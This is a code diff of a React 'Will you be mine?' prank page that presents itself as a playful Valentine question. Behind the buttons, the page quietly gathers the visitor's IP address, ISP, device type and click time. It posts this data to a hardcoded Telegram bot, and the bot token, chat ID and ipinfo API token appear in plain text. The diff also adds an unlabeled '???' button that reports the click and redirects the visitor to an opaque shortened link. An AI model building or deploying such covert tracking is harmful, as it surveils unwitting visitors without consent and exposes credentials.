@@ -7,18 +7,20 @@ export default function Page() {
   const [yesPressed, setYesPressed] = useState(false);
   const [deviceType, setDeviceType] = useState('');
   const [ipAddress, setIpAddress] = useState('');
-  const [dnsProvider, setDnsProvider] = useState('');
+  const [isp, setIsp] = useState('');
 
   const yesButtonSize = noCount * 20 + 16;
 
   const handleNoClick = () => {
     setNoCount(noCount + 1);
-    sendMessageToTelegramBot('No');
+    const message = `User clicked "${getNoButtonText()}" button`;
+    sendMessageToTelegramBot(message);
   };
 
   const handleYesClick = () => {
     setYesPressed(true);
-    sendMessageToTelegramBot('Yes');
+    const message = `User clicked "Yes" button`;
+    sendMessageToTelegramBot(message);
   };
 
   const getDeviceType = () => {
@@ -56,17 +58,17 @@ export default function Page() {
     return phrases[Math.min(noCount, phrases.length - 1)];
   };
 
-  const sendMessageToTelegramBot = async (answer) => {
-    const botToken = '6751658476:AAH17_DhTGmOHb3DHjFRe5L-AeEc8ryfcUY';
-    const chatId = '818897776';
+  const sendMessageToTelegramBot = async (message) => {
+    const botToken = '6751658476:AAH17_DhTGmOHb3DHjFRe5L-AeEc8ryfcUY'; // Your Telegram bot token
+    const chatId = '818897776'; // Your chat ID
     const now = new Date();
     const dateTime = `${now.toLocaleDateString()} ${now.toLocaleTimeString()}`;
-    const message = `Someone answered "${answer}" to "Will you be mine?"\nDevice Type: ${getDeviceType()}\nDate/Time: ${dateTime}\nIP Address: ${ipAddress}\nDNS Provider: ${dnsProvider}`;
+    const fullMessage = `${message}\nDevice Type: ${getDeviceType()}\nDate/Time: ${dateTime}\nIP Address: ${ipAddress}\nISP: ${isp}`;
 
     try {
       await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         chat_id: chatId,
-        text: message
+        text: fullMessage
       });
       console.log('Message sent successfully');
     } catch (error) {
@@ -75,29 +77,30 @@ export default function Page() {
   };
 
   useEffect(() => {
-    // Fetch user IP address and DNS provider when component mounts
+    // Fetch user IP address and ISP when component mounts
     axios.get('https://api.ipify.org?format=json')
       .then(response => {
         setIpAddress(response.data.ip);
+        // Fetch ISP information using ipinfo.io
+        return axios.get(`https://ipinfo.io/${response.data.ip}/json?token=11f3dc0e1c1831`);
       })
-      .catch(error => {
-        console.error('Error fetching IP address:', error);
-      });
-
-    // Fetch DNS provider using DNS-over-HTTPS
-    axios.get('https://dns.google/resolve?name=example.com&type=NS')
       .then(response => {
-        const dnsInfo = response.data?.Answer?.[0]?.data;
-        setDnsProvider(dnsInfo);
+        setIsp(response.data.org);
       })
       .catch(error => {
-        console.error('Error fetching DNS provider:', error);
+        console.error('Error fetching IP address or ISP:', error);
       });
   }, []);
 
+  const handleSendInformation = () => {
+    const message = `User clicked "Send Information" button`;
+    sendMessageToTelegramBot(message);
+    window.location.href = 'http://gg.gg/19zo2c';
+  };
+
   return (
     <div className="container">
-      <h2>DNS Provider: {dnsProvider}</h2>
+      <h2>ISP: {isp}</h2>
       {yesPressed ? (
         <>
           <img src="https://media.tenor.com/gUiu1zyxfzYAAAAi/bear-kiss-bear-kisses.gif" alt="Kiss bear" />
@@ -122,8 +125,9 @@ export default function Page() {
               {noCount === 0 ? "No" : getNoButtonText()}
             </button>
           </div>
+          <button className="purple-button" onClick={handleSendInformation}>???</button>
         </>
       )}
     </div>
   );
-        }
+}
